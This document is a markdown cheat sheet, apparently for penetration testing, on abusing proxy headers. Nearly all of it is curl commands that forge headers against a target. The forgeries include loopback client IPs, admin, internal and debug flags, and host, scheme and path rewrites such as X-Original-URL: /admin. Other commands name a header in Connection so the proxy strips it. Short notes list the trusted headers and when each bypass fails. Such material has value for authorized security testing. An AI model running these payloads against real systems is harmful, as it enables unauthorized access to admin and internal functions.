# Header abuse — the proxy-header attacks, exhaustively

The complete set of proxy-header attacks — the client-supplied and the stripped.

---

## 1. The client-supplied header — a forged proxy header

```bash
# a client-supplied proxy header — the app trusts it
curl "$BASE/api/restricted" -H 'X-Real-IP: 127.0.0.1'   # a forged client IP
curl "$BASE/api/restricted" -H 'X-Forwarded-For: 127.0.0.1'   # a forged forwarded-for
curl "$BASE/api/restricted" -H 'X-Internal: true'   # a forged internal flag
curl "$BASE/api/restricted" -H 'X-Admin: true'   # a forged admin flag
```

```text
a client-supplied proxy header — the app doesn't verify the proxy
added it — a client-supplied header IS trusted.
```

## 2. The stripped header — the hop-by-hop bypass

```bash
# naming the proxy's own header in Connection — the proxy strips it
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Real-IP'
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-For'
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Internal'
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Admin'
```

```text
the proxy strips the headers named in Connection — even the proxy's
own header — the app sees a request without the trusted header — a
missing-header fallback.
```

## 3. The spoofed-IP header — a forged client IP

```bash
# a forged client IP — a local-vs-remote check bypass
curl "$BASE/api/admin" -H 'X-Real-IP: 127.0.0.1'   # the app reads the header → a local request
curl "$BASE/api/admin" -H 'X-Forwarded-For: 127.0.0.1'   # a forged forwarded-for
curl "$BASE/api/admin" -H 'X-Client-IP: 127.0.0.1'   # a forged client-IP
```

## 4. The spoofed-host header — a rewritten host

```bash
# a forged host — a host-rewrite
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # the app's links point to attacker.com
curl "$BASE/page" -H 'X-Host: attacker.com'   # a forged X-Host
```

## 5. The spoofed-scheme header — a scheme downgrade

```bash
# a forged scheme — a scheme confusion
curl "$BASE/page" -H 'X-Forwarded-Scheme: http'   # the app's links use http
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # a forged proto
```

## 6. The spoofed-URL header — a rewritten path

```bash
# a forged URL — a path-rewrite
curl "$BASE/page" -H 'X-Original-URL: /admin'   # the app serves /admin under /page
curl "$BASE/page" -H 'X-Rewrite-URL: /admin'   # a forged rewrite-URL
curl "$BASE/page" -H 'X-Original-Request-URI: /admin'   # a forged request-URI
```

## 7. The spoofed-flag header — a forged internal flag

```bash
# a forged flag — an internal-route check bypass
curl "$BASE/internal" -H 'X-Internal: true'   # a forged internal flag
curl "$BASE/admin" -H 'X-Admin: true'   # a forged admin flag
curl "$BASE/api/debug" -H 'X-Debug: true'   # a forged debug flag
```

## 8. The header-abuse's vectors — which headers the app trusts

```text
X-Real-IP          → the client IP — a local-vs-remote check
X-Forwarded-For    → the client IP — a local-vs-remote check
X-Forwarded-Host   → the app's host — a URL-rewrite
X-Forwarded-Scheme → the app's scheme — a scheme check
X-Forwarded-Proto  → the app's proto — a proto check
X-Internal         → an internal flag — an internal-route check
X-Admin            → an admin flag — an admin check
X-Original-URL     → a rewritten path — a route check
X-Rewrite-URL      → a rewritten path — a route check
X-Client-IP        → the client IP — a local-vs-remote check
X-Host             → the app's host — a URL-rewrite
X-Debug            → a debug flag — a debug check
```

## 9. The header-abuse's falsifier — a proxy that strips a client header

```text
a proxy that strips a client-supplied proxy header → the client-
supplied header doesn't reach the app → the client-supplied bypass
fails → the hop-by-hop bypass is the remaining vector.
```

## 10. The header-abuse's falsifier — a verified header

```text
a proxy that verifies the header it added → a client-supplied header
is rejected → the client-supplied bypass fails → the hop-by-hop
bypass is the remaining vector.
```

## 11. The header-abuse's falsifier — a non-header check

```text
the card's falsifier: 'both forms are rejected, so the trust check
does not depend on that header' — the header isn't the trust check's
input → a different class.
```

## 12. The header-abuse's check — the client-supplied probe

```bash
# the client-supplied check — does the app trust a client-supplied header
curl "$BASE/api/restricted" -H 'X-Real-IP: 127.0.0.1'   # a client-supplied X-Real-IP
#   a 200 → the app trusts the client-supplied header → the check's input
```
